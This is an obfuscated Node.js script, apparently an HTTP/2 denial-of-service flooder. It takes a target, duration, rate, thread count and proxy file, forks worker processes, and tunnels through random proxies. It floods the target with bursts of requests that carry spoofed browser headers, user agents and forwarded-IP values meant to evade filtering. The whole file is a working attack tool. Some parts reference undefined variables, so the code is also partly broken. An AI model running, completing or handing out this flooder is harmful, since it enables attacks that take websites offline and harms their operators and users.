const _0x4efeb9 = _0x5961;
(function (_0x5528eb, _0x580002) {
    const _0x33cf61 = _0x5961,
        _0x40799c = _0x5528eb();
    while (!![]) {
        try {
            const _0x4d8201 = parseInt(_0x33cf61(0xaa)) / 0x1 + parseInt(_0x33cf61(0x80)) / 0x2 * (parseInt(_0x33cf61(0xa6)) / 0x3) + -parseInt(_0x33cf61(0xf3)) / 0x4 * (-parseInt(_0x33cf61(0xb5)) / 0x5) + -parseInt(_0x33cf61(0xf2)) / 0x6 + -parseInt(_0x33cf61(0x9a)) / 0x7 * (-parseInt(_0x33cf61(0xb0)) / 0x8) + parseInt(_0x33cf61(0x99)) / 0x9 * (-parseInt(_0x33cf61(0xc3)) / 0xa) + -parseInt(_0x33cf61(0x97)) / 0xb;
            if (_0x4d8201 === _0x580002) break;
            else _0x40799c['push'](_0x40799c['shift']());
        } catch (_0x19d0f1) {
            _0x40799c['push'](_0x40799c['shift']());
        }
    }
}(_0x5e08, 0x424fb));
const net = require(_0x4efeb9(0x83)),
    http2 = require(_0x4efeb9(0xe8)),
    tls = require(_0x4efeb9(0xb9)),
    cluster = require('cluster'),
    url = require('url'),
    crypto = require(_0x4efeb9(0xcc)),
    UserAgent = require('user-agents'),
    fs = require('fs'),
    {
        HeaderGenerator
    } = require('header-generator');
process[_0x4efeb9(0xa4)](0x0), require('events')[_0x4efeb9(0xed)][_0x4efeb9(0xa1)] = 0x0, process['on'](_0x4efeb9(0xb6), function (_0x32d0fa) {});
process['argv'][_0x4efeb9(0xf1)] < 0x7 && (console['log'](_0x4efeb9(0xbc)), process['exit']());
const headers = {};

function _0x5e08() {
    const _0x88bf2c = ['no-cache', 'trailers', 'GET', ':path', 'x-cache', '43728VXGPqH', ' / HTTP/2', 'write', 'bytes', 'utf-8', '92390CBnuqJ', 'uncaughtException', 'floor', 'upgrade-insecure-requests', 'tls', 'ECDHE-ECDSA-AES128-GCM-SHA256|ECDHE-ECDSA-CHACHA20-POLY1305|ECDHE-RSA-AES128-GCM-SHA256|ECDHE-RSA-CHACHA20-POLY1305]:ECDHE+AES128:RSA+AES128:ECDHE+AES256:RSA+AES256:ECDHE+3DES:RSA+3DES', 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512', 'node tls <target> <time> <rate> <threads> <proxyfile>', 'pragma', 'Real-IP', ':443\x0d\x0aConnection: Keep-Alive\x0d\x0a\x0d\x0a', 'random', 'firefox', 'sec-ch-ua-platform', '10rnlzsu', 'ecdsa_brainpoolP384r1tls13_sha384', 'sec-fetch-dest', 'sec-ch-ua', 'includes', 'error: invalid response from proxy server', 'http1.1', 'getCiphers', 'error: ', 'crypto', 'href', 'server', 'cookie', 'setTimeout', 'path', 'sm2sig_sm3', 'en-US', 'accept', 'Accept-Ranges', 'accept-language', 'Client-IP', 'port', 'x-requested-with', 'parse', 'Origin', 'timeout', 'sec-fetch-mode', 'parameters', 'X-XSS-Protection', 'Timing-Allow-Origin', 'HTTP', 'content-encoding', 'host', ':443', 'accept-ch', 'rsa_pkcs1_sha384', 'content-security-policy', 'http2', 'setKeepAlive', 'ecdsa_sha1', 'TLSv1_2_method', ':443 HTTP/1.1\x0d\x0aHost: ', 'EventEmitter', 'isMaster', 'TLSv1_1_method', 'exit', 'length', '2137614lvBdTv', '116OyQWJn', 'Rate', 'ecdsa_secp521r1_sha512', 'rsa_pss_pss_sha256', 'destroy', 'error', 'toString', 'fork', 'rsa_pss_rsae_sha512', 'request', 'argv', 'sec-fetch-site', 'error: timeout exceeded', 'x-frame-options', 'cross-origin-opener-policy', 'access-control-allow-origin', '414sLzXhg', 'x-content-type-options', ':scheme', 'net', 'address', 'close', 'Via', 'hostname', 'content-length', 'ecdsa_brainpoolP256r1tls13_sha256', 'desktop', 'Strict-Transport-Security', 'date', 'rsa_pkcs1_sha1', 'alt-svc', ':method', 'content-type', 'vary', 'join', 'cache-control', 'data', 'last-modified', 'HTTP/1.1 200', '3417656VCoonU', 'Referrer Policy', '1877778XUxdGh', '280RZoIEr', 'rsa_pss_rsae_sha256', 'https', 'ecdsa_secp384r1_sha384', 'connect', 'response', 'XMLHttpRequest', 'defaultMaxListeners', 'split', 'x-forwarded-for', 'setMaxListeners', 'target', '4185bXGEUF', 'CONNECT ', 'rsa_pss_pss_sha384', 'TLSv1_3_method', '103951IUvcye'];
    _0x5e08 = function () {
        return _0x88bf2c;
    };
    return _0x5e08();
}

function readLines(_0x2a1084) {
    const _0x2473d7 = _0x4efeb9;
    return fs['readFileSync'](_0x2a1084, _0x2473d7(0xb4))[_0x2473d7(0x76)]()['split'](/\r?\n/);
}

function randomIntn(_0x10178e, _0x4cb6a6) {
    const _0x4267e2 = _0x4efeb9;
    return Math[_0x4267e2(0xb7)](Math[_0x4267e2(0xc0)]() * (_0x4cb6a6 - _0x10178e) + _0x10178e);
}

function randomElement(_0x5e19fc) {
    const _0x4f7239 = _0x4efeb9;
    return _0x5e19fc[randomIntn(0x0, _0x5e19fc[_0x4f7239(0xf1)])];
}
const args = {
    'target': process[_0x4efeb9(0x7a)][0x2],
    'time': ~~process[_0x4efeb9(0x7a)][0x3],
    'Rate': ~~process[_0x4efeb9(0x7a)][0x4],
    'threads': ~~process[_0x4efeb9(0x7a)][0x5],
    'proxyFile': process[_0x4efeb9(0x7a)][0x6]
};
var proxies = readLines(args['proxyFile']);

function _0x5961(_0x15a51f, _0x1f1ac7) {
    const _0x5e0878 = _0x5e08();
    return _0x5961 = function (_0x59615f, _0x2adee0) {
        _0x59615f = _0x59615f - 0x76;
        let _0x3e832e = _0x5e0878[_0x59615f];
        return _0x3e832e;
    }, _0x5961(_0x15a51f, _0x1f1ac7);
}
const parsedTarget = url[_0x4efeb9(0xda)](args[_0x4efeb9(0xa5)]);
let headerGenerator = new HeaderGenerator({
    'browsers': [{
        'name': _0x4efeb9(0xc1),
        'minVersion': 0x64,
        'httpVersion': '2'
    }],
    'devices': [_0x4efeb9(0x8a)],
    'operatingSystems': ['windows'],
    'locales': [_0x4efeb9(0xd3), 'en']
});
if (cluster[_0x4efeb9(0xee)])
    for (let counter = 0x1; counter <= args['threads']; counter++) {
        cluster[_0x4efeb9(0x77)]();
    } else setInterval(runFlooder);
class NetSocket {
    constructor() {}[_0x4efeb9(0xe1)](_0x4f14f8, _0x35088c) {
        const _0x8155ef = _0x4efeb9,
            _0x188d79 = _0x4f14f8[_0x8155ef(0x84)]['split'](':'),
            _0x12e7de = _0x188d79[0x0],
            _0xb9f9de = _0x8155ef(0xa7) + _0x4f14f8['address'] + _0x8155ef(0xec) + _0x4f14f8[_0x8155ef(0x84)] + _0x8155ef(0xbf),
            _0x223f1a = new Buffer['from'](_0xb9f9de),
            _0x111246 = net['connect']({
                'host': _0x4f14f8[_0x8155ef(0xe3)],
                'port': _0x4f14f8[_0x8155ef(0xd8)]
            });
        _0x111246[_0x8155ef(0xd0)](_0x4f14f8[_0x8155ef(0xdc)] * 0x2710), _0x111246[_0x8155ef(0xe9)](!![], 0xea60), _0x111246['on'](_0x8155ef(0x9e), () => {
            const _0xe7372f = _0x8155ef;
            _0x111246[_0xe7372f(0xb2)](_0x223f1a);
        }), _0x111246['on'](_0x8155ef(0x94), _0x2f49cf => {
            const _0x3503eb = _0x8155ef,
                _0x527484 = _0x2f49cf[_0x3503eb(0x76)]('utf-8'),
                _0x5ae6f1 = _0x527484[_0x3503eb(0xc7)](_0x3503eb(0x96));
            if (_0x5ae6f1 === ![]) return _0x111246[_0x3503eb(0xf7)](), _0x35088c(undefined, _0x3503eb(0xc8));
            return _0x35088c(_0x111246, undefined);
        }), _0x111246['on'](_0x8155ef(0xdc), () => {
            const _0xb8d66b = _0x8155ef;
            return _0x111246['destroy'](), _0x35088c(undefined, _0xb8d66b(0x7c));
        }), _0x111246['on'](_0x8155ef(0xf8), _0x658ec2 => {
            const _0x4549b4 = _0x8155ef;
            return _0x111246['destroy'](), _0x35088c(undefined, _0x4549b4(0xcb) + _0x658ec2);
        });
    }
}
const sigalgs = _0x4efeb9(0xbb);
'ecdsa_secp256r1_sha256', _0x4efeb9(0x89), _0x4efeb9(0xc4), 'ecdsa_brainpoolP512r1tls13_sha512', _0x4efeb9(0xea), 'ed25519', 'ed448', _0x4efeb9(0x8d), 'rsa_pkcs1_sha256', _0x4efeb9(0xe6), _0x4efeb9(0xf6), _0x4efeb9(0xa8), 'rsa_pss_pss_sha512', _0x4efeb9(0xd2), _0x4efeb9(0x9d), _0x4efeb9(0xf5), _0x4efeb9(0x9b), 'rsa_pss_rsae_sha384', _0x4efeb9(0x78), 'rsa_pkcs1_sha512';
const Header = new NetSocket();
headers[_0x4efeb9(0x8f)] = _0x4efeb9(0xad), headers[_0x4efeb9(0xad)] = _0x4efeb9(0xb1), headers[_0x4efeb9(0x98)] = randomHeaders[_0x4efeb9(0x98)], headers[_0x4efeb9(0xae)] = parsedTarget[_0x4efeb9(0xd1)], headers[_0x4efeb9(0x82)] = _0x4efeb9(0x9c), headers[_0x4efeb9(0xd5)] = _0x4efeb9(0xb3), headers[_0x4efeb9(0x7f)] = '*', headers['Keep-Alive'] = _0x4efeb9(0xde), headers[_0x4efeb9(0xdb)] = randomHeaders[_0x4efeb9(0xdb)], headers[_0x4efeb9(0x7d)] = randomHeaders['x-frame-options'], headers[_0x4efeb9(0xd4)] = randomHeaders['accept'], headers[_0x4efeb9(0x8c)] = randomHeaders[_0x4efeb9(0x8c)], headers['alt-svc'] = randomHeaders[_0x4efeb9(0x8e)], headers[_0x4efeb9(0xd7)] = parsedProxy[0x0], headers[_0x4efeb9(0xbe)] = parsedProxy[0x0], headers[_0x4efeb9(0x86)] = randomHeaders['Via'], headers[_0x4efeb9(0xe5)] = randomHeaders[_0x4efeb9(0xe5)], headers[_0x4efeb9(0x8b)] = randomHeaders[_0x4efeb9(0x8b)], headers[_0x4efeb9(0xdf)] = randomHeaders[_0x4efeb9(0xdf)], headers[_0x4efeb9(0xaf)] = randomHeaders[_0x4efeb9(0xaf)], headers[_0x4efeb9(0xd6)] = randomHeaders[_0x4efeb9(0xd6)], headers['accept-encoding'] = randomHeaders['accept-encoding'], headers['Connection'] = 'keep-alive', headers[_0x4efeb9(0x90)] = randomHeaders[_0x4efeb9(0x90)], headers[_0x4efeb9(0xc6)] = randomHeaders['sec-ch-ua'], headers['content-length'] = randomHeaders[_0x4efeb9(0x88)], headers[_0x4efeb9(0x93)] = randomHeaders[_0x4efeb9(0x93)], headers[_0x4efeb9(0xb8)] = randomHeaders[_0x4efeb9(0xb8)], headers[_0x4efeb9(0xc2)] = randomHeaders[_0x4efeb9(0xc2)], headers['TE'] = _0x4efeb9(0xac), headers[_0x4efeb9(0xe0)] = '*', headers[_0x4efeb9(0xce)] = randomHeaders[_0x4efeb9(0xce)], headers['Age'] = randomHeaders['Age'], headers[_0x4efeb9(0xe7)] = randomHeaders[_0x4efeb9(0xe7)], headers[_0x4efeb9(0x7e)] = randomHeaders[_0x4efeb9(0x7e)], headers[_0x4efeb9(0xd9)] = _0x4efeb9(0xa0), headers[_0x4efeb9(0x91)] = randomHeaders[_0x4efeb9(0x91)], headers['report-to'] = randomHeaders['report-to'], headers['etag'] = randomHeaders['etag'], headers[_0x4efeb9(0x95)] = randomHeaders[_0x4efeb9(0x95)], headers[_0x4efeb9(0xe2)] = randomHeaders[_0x4efeb9(0xe2)], headers[_0x4efeb9(0xc5)] = randomHeaders[_0x4efeb9(0xc5)], headers[_0x4efeb9(0xdd)] = randomHeaders[_0x4efeb9(0xdd)], headers[_0x4efeb9(0x7b)] = randomHeaders[_0x4efeb9(0x7b)], headers[_0x4efeb9(0xbd)] = _0x4efeb9(0xab), headers[_0x4efeb9(0xcf)] = randomHeaders['cookie'], headers[_0x4efeb9(0x81)] = randomHeaders[_0x4efeb9(0x81)];

function runFlooder() {
    const _0x3ecd6e = _0x4efeb9,
        _0x3915c4 = randomElement(proxies),
        _0x377feb = _0x3915c4[_0x3ecd6e(0xa2)](':'),
        _0x191f08 = new UserAgent();
    var _0x32f9d7 = _0x191f08['toString']();
    headers[':authority'] = parsedTarget['host'], headers[_0x3ecd6e(0xa3)] = _0x377feb[0x0], headers['x-forwarded-proto'] = _0x3ecd6e(0x9c), headers['user-agent'] = _0x32f9d7;
    const _0x424296 = {
        'host': _0x377feb[0x0],
        'port': ~~_0x377feb[0x1],
        'address': parsedTarget[_0x3ecd6e(0xe3)] + _0x3ecd6e(0xe4),
        'timeout': 0x64
    };
    Header['HTTP'](_0x424296, (_0x223bb3, _0x5b5766) => {
        const _0x572904 = _0x3ecd6e;
        if (_0x5b5766) return;
        _0x223bb3[_0x572904(0xe9)](!![], 0xea60);
        const _0x28d3bc = {
                'ALPNProtocols': ['h2', _0x572904(0xc9)],
                'followAllRedirects': !![],
                'challengeToSolve': Infinity,
                'clientTimeout': 0x1388,
                'clientlareMaxTimeout': 0x3a98,
                'echdCurve': 'X25519:P-256:P-384',
                'ciphers': tls[_0x572904(0xca)]()[_0x572904(0x92)](':') + _0x572904(0xba),
                'rejectUnauthorized': ![],
                'socket': _0x223bb3,
                'decodeEmails': ![],
                'honorCipherOrder': !![],
                'sigalgs': sigalgs,
                'requestCert': !![],
                'servername': url[_0x572904(0x87)],
                'secure': !![],
                'port': 0x1bb,
                'secureProtocol': [_0x572904(0xef), _0x572904(0xeb), _0x572904(0xa9), 'TLS_method'],
                'uri': parsedTarget[_0x572904(0xe3)],
                'servername': parsedTarget[_0x572904(0xe3)]
            },
            _0x15ff1e = tls[_0x572904(0x9e)](0x1bb, parsedTarget[_0x572904(0xe3)], _0x28d3bc);
        _0x15ff1e[_0x572904(0xe9)](!![], 0x3c * 0x2710);
        const _0x1d610d = http2[_0x572904(0x9e)](parsedTarget[_0x572904(0xcd)], {
            'protocol': 'https:',
            'settings': {
                'headerTableSize': 0x10000,
                'maxConcurrentStreams': 0x3e8,
                'initialWindowSize': 0x600000,
                'maxHeaderListSize': 0x40000,
                'enablePush': ![]
            },
            'maxSessionMemory': 0xfa00,
            'maxDeflateDynamicTableSize': 0xffffffff,
            'createConnection': () => _0x15ff1e,
            'socket': _0x223bb3
        });
        _0x1d610d['settings']({
            'headerTableSize': 0x10000,
            'maxConcurrentStreams': 0x4e20,
            'initialWindowSize': 0x600000,
            'maxHeaderListSize': 0x40000,
            'enablePush': ![]
        }), _0x1d610d['on'](_0x572904(0x9e), () => {
            const _0x3081c4 = setInterval(() => {
                const _0x5a52cf = _0x5961;
                for (let _0x41aca1 = 0x0; _0x41aca1 < args[_0x5a52cf(0xf4)]; _0x41aca1++) {
                    const _0x346ddc = _0x1d610d[_0x5a52cf(0x79)](headers)['on'](_0x5a52cf(0x9f), _0x442591 => {
                        const _0x22a818 = _0x5a52cf;
                        _0x346ddc['close'](), _0x346ddc[_0x22a818(0xf7)]();
                        return;
                    });
                    _0x346ddc['end']();
                }
            }, 0x3e8);
        }), _0x1d610d['on'](_0x572904(0x85), () => {
            const _0x48e3cc = _0x572904;
            _0x1d610d[_0x48e3cc(0xf7)](), _0x223bb3['destroy']();
            return;
        }), _0x1d610d['on'](_0x572904(0xf8), _0x5f4cb0 => {
            const _0x140494 = _0x572904;
            _0x1d610d[_0x140494(0xf7)](), _0x223bb3[_0x140494(0xf7)]();
            return;
        });
    });
}
const KillScript = () => process[_0x4efeb9(0xf0)](0x1);
setTimeout(KillScript, args['time'] * 0x3e8);